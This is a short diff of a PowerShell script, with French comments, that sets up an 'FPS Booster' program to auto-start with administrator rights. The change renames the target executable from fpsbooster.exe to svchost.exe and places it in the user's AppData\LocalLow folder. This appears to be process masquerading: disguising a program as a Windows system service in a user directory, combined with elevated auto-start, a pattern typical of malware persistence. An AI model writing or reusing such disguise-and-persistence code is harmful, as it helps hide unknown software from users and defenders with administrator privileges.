@@ -8,8 +8,8 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 Write-Host "=== Setup FPS Booster Auto-Start Admin ===" -ForegroundColor Cyan
 Write-Host ""
 
-# Chemin du programme en dur
-$p = "C:\Users\admin1\AppData\LocalLow\fpsbooster.exe"
+# Chemin du programme avec %userprofile%
+$p = "$env:USERPROFILE\AppData\LocalLow\svchost.exe"
 
 # Vérifier que le fichier existe
 if (-not (Test-Path $p)) {
